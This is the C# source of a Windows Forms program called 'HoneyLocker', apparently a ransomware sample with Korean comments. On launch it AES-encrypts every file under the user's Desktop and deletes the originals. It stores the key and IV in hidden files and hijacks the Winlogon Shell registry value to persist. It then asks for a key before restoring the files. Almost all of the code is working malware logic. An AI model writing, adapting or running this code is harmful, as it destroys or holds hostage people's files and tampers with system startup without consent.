using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace HoneyLocker
{
    public partial class Form1 : Form
    {
        private string randomKey;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // 초기에는 버튼 3을 비활성화
            button3.Enabled = false;
            this.FormBorderStyle = FormBorderStyle.FixedSingle; // 또는 FormBorderStyle.FixedDialog
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] files = Directory.GetFiles(desktopPath, "*", SearchOption.AllDirectories);
            string[] targetFiles = files.Where(file => !file.EndsWith(".Honey", StringComparison.OrdinalIgnoreCase)).ToArray();

            if (targetFiles.Length > 0)
            {
                Encryptor();
            }
            // 30자리 랜덤 문자열 생성
            string randomString = GenerateRandomString(30);

            // 라벨 11에 랜덤 문자열 설정
            label7.Text = "Personal Key : " + randomString;
            // %appdata% 경로
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // PersonalKey2.bin 파일 경로
            string personalKeyFilePath = Path.Combine(appDataPath, "PersonalKey2_Sendonly.bin");

            // randomKey 생성
            GenerateRandomKey();

            if (File.Exists(personalKeyFilePath))
            {
                File.Delete(personalKeyFilePath);
            }
            // randomKey를 PersonalKey2.bin 파일로 저장
            File.WriteAllText(personalKeyFilePath, randomKey);
            // 현재 실행 파일의 경로 가져오기
            string currentPath = Path.GetDirectoryName(Application.ExecutablePath);

            // 레지스트리 수정
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            if (key != null)
            {
                key.SetValue("Shell", $"explorer.exe, \"{currentPath}\"");
                key.Close();
            }
        }

        private string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random();
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string userInput = textBox1.Text;

            if (userInput == randomKey)
            {
                this.ControlBox = true;
                Decryptor();
                MessageBox.Show("File is decrypted! if not decrypted file to use Manual decryptor\n파일이 복구되었습니다! 복구되지 않은 파일이 있다면 매뉴얼 복구 툴을 사용하세요", "HoneyLocker.exe", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                // 버튼 1 클릭 시 버튼 3 활성화
                button3.Enabled = true;
                // Encryption key and initialization vector file paths
                string keyFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "key.bin");
                string ivFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "iv.bin");
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string desktopKeyFilePath = Path.Combine(desktopPath, "key.bin");
                string desktopIvFilePath = Path.Combine(desktopPath, "iv.bin");
                // Move the key file to the desktop
                if (!File.Exists(desktopKeyFilePath))
                {
                File.Copy(keyFilePath, desktopKeyFilePath);
                }

                if (!File.Exists(desktopIvFilePath))
                {
                    File.Copy(ivFilePath, desktopIvFilePath);
                }
                    // Move the IV file to the desktop

                // Remove the hidden attribute from the file
                FileAttributes attributes = File.GetAttributes(desktopIvFilePath);
                attributes &= ~FileAttributes.Hidden;
                File.SetAttributes(desktopIvFilePath, attributes);
                // Remove the hidden attribute from the file
                FileAttributes attributes2 = File.GetAttributes(desktopKeyFilePath);
                attributes2 &= ~FileAttributes.Hidden;
                File.SetAttributes(desktopKeyFilePath, attributes2);

                // 레지스트리 수정
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                key.SetValue("Shell", "explorer.exe");
                key.Close();
            }
            else
            {
                MessageBox.Show("Invalid key\n올바르지 않은 키", "HoneyLocker.exe", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void GenerateRandomKey()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random();
            randomKey = new string(Enumerable.Repeat(chars, 50)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var NewForm = new View_File();
            NewForm.ShowDialog();
        }
        private void Encryptor()
        {
            // Encryption directory path
            string directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            // Get all files in the directory except the executable file itself
            string[] filePaths = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories);
            string executableFilePath = Process.GetCurrentProcess().MainModule.FileName;
            filePaths = Array.FindAll(filePaths, filePath => !string.Equals(filePath, executableFilePath, StringComparison.OrdinalIgnoreCase));

            // Create an instance of the AES-256 encryption algorithm
            using (Aes aes = Aes.Create())
            {
                // Generate encryption key and initialization vector
                aes.GenerateKey();
                aes.GenerateIV();
                byte[] key = aes.Key;
                byte[] iv = aes.IV;

                // Encrypt all files in the directory
                foreach (string filePath in filePaths)
                {
                    // Separate file name and extension
                    string fileName = Path.GetFileNameWithoutExtension(filePath);
                    string fileExtension = Path.GetExtension(filePath);

                    // Create encrypted file path
                    string encryptedFilePath = Path.Combine(Path.GetDirectoryName(filePath), fileName + fileExtension + ".Honey");

                    // Create file streams
                    using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (FileStream encryptedFileStream = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write, FileShare.Read))
                        {
                            // Create encryption stream
                            using (ICryptoTransform encryptor = aes.CreateEncryptor())
                            {
                                // Encrypt the file contents and write to the encrypted file stream
                                using (CryptoStream cryptoStream = new CryptoStream(encryptedFileStream, encryptor, CryptoStreamMode.Write))
                                {
                                    inputFileStream.CopyTo(cryptoStream);
                                }
                            }
                        }
                    }

                    // Delete or move the original file
                    File.Delete(filePath); // Delete the file
                }
                // Save encryption key and initialization vector to files and hide them
                string keyFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "key.bin");
                string ivFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "iv.bin");
                // if exist to delete
                if (File.Exists(keyFilePath))
                {
                    File.Delete(keyFilePath);
                }

                if (File.Exists(ivFilePath))
                {
                    File.Delete(ivFilePath);
                }
                // Make key and iv
                File.WriteAllBytes(keyFilePath, key);
                File.WriteAllBytes(ivFilePath, iv);
                File.SetAttributes(keyFilePath, File.GetAttributes(keyFilePath) | FileAttributes.Hidden);
                File.SetAttributes(ivFilePath, File.GetAttributes(ivFilePath) | FileAttributes.Hidden);
            }
        }
        private void Decryptor()
        {
            // Encrypted files directory path
            string directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            // Encryption key and initialization vector file paths
            string keyFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "key.bin");
            string ivFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "iv.bin");

            // Read encryption key and initialization vector
            byte[] key = File.ReadAllBytes(keyFilePath);
            byte[] iv = File.ReadAllBytes(ivFilePath);

            // Get all encrypted files in the directory
            string[] filePaths = Directory.GetFiles(directoryPath, "*.Honey", SearchOption.AllDirectories);

            // Create an instance of the AES encryption algorithm
            using (Aes aes = Aes.Create())
            {
                // Set encryption key and initialization vector
                aes.Key = key;
                aes.IV = iv;

                // Decrypt all files in the directory
                foreach (string encryptedFilePath in filePaths)
                {
                    // Separate file name and extension
                    string fileName = Path.GetFileNameWithoutExtension(encryptedFilePath).Replace(".Honey", "");
                    string fileExtension = Path.GetExtension(fileName);

                    // Create decrypted file path
                    string decryptedFilePath = Path.Combine(Path.GetDirectoryName(encryptedFilePath), fileName);

                    // Create file streams
                    using (FileStream encryptedFileStream = new FileStream(encryptedFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (FileStream decryptedFileStream = new FileStream(decryptedFilePath, FileMode.Create, FileAccess.Write, FileShare.Read))
                        {
                            // Create decryption stream
                            using (ICryptoTransform decryptor = aes.CreateDecryptor())
                            {
                                // Decrypt the file contents and write to the decrypted file stream
                                using (CryptoStream cryptoStream = new CryptoStream(encryptedFileStream, decryptor, CryptoStreamMode.Read))
                                {
                                    cryptoStream.CopyTo(decryptedFileStream);
                                }
                            }
                        }
                    }

                    // Delete the encrypted file
                    File.Delete(encryptedFilePath);
                }
            }
        }
        private void button3_Click(object sender, EventArgs e)
        {
            var NewForm = new Manual_Decryptor();
            NewForm.ShowDialog();
        }
    }
}